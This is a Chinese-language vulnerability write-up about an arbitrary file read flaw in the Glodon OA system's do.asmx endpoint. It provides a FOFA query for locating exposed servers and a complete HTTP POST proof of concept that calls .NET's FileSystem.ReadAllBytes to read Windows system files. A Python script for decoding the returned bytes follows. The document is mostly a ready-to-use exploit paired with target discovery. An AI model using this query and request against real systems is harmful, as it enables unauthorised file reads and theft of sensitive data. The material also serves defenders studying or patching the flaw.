# 广联达OA系统接口do.asmx存在任意文件读取漏洞

广联达OA系统接口` /m/mobileAction.ashx/do.asmx`存在任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

## fofa

```javascript
body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
```

## poc

```javascript
POST /m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&action=ReadAllBytes HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/json
Connection: close

["\"C:\\\\Windows\\\\win.ini\""]
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409141646757.png)

### 解密脚本

```python
def ascii_to_char(ascii_codes):  
    """将ASCII码列表转换为字符"""  
    return ''.join(chr(code) for code in ascii_codes)  
  
def char_to_ascii(char):  
    """将字符串转换为ASCII码列表"""  
    return [ord(c) for c in char]  
  
def main():  
    print("0 字符转ASCII码")  
    print("1 ASCII码转字符")  
    choice = input("请选择转换类型（0/1）: ")  
  
    if choice == '0':  
        # 字符转ASCII码  
        chars = input("请输入要转换的字符: ")  
        ascii_codes = char_to_ascii(chars)  
        print("字符转ASCII码:", ascii_codes)  
    elif choice == '1':  
        # ASCII码转字符  
        ascii_codes_str = input("请输入以逗号分隔的ASCII码（例如：65,66,67）: ")  
        ascii_codes = [int(code.strip()) for code in ascii_codes_str.split(',')]  
        converted_chars = ascii_to_char(ascii_codes)  
        print("ASCII码转字符:", converted_chars)  
    else:  
        print("无效的输入，请输入0或1。")  
  
if __name__ == "__main__":  
    main()
```

